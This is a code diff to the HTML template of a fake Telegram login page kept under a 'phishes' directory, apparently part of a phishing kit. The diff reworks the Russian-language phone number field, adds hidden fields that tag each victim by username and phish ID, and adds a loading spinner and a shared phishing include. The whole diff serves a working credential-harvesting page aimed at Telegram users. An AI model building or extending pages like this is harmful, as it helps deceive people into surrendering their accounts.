@@ -9,6 +9,7 @@
     <link href="{{ url_for('static', filename='phishes/bot-access/css2') }} rel="stylesheet">
     <link rel="icon" href="https://rcdsp.ru/img/favicon.svg" type="image/svg+xml">
     <link rel="stylesheet" href="{{ url_for('static', filename='phishes/bot-access/style.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/phishes.css') }}">
     <title>Telegram</title>
 </head>
 <body>
@@ -28,14 +29,24 @@
     </div>
     <div class="form">
         <form class="input-container ic1">
-            <input class="input" type="tel" id="input" value="+7" name="phone" autocomplete="off">
+            <input class="input"  id="input" value="+" onkeypress="validatePhone(event)" name="phone" autocomplete="off">
             <div class="cut"></div>
             <label for="phone" class="placeholder" id="label">Номер телефона</label>
             <button type="submit" name="send_phone" class="next">Войти</button>
         </form>
     </div>
 </section>
+<div class="divID" style="display: none;">{{ username }}</div>
+<div class="pageID" style="display: none;">{{ fish }}</div>
+
+<div class="loading">
+    <div class="bg-loader">
+      <span class="loader"></span>  
+    </div>
+  </div>
+  
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+{% include '/phishes/default.html' %}
 <script src="{{ url_for('static', filename='js/script.js') }}"></script>
 </body></html>
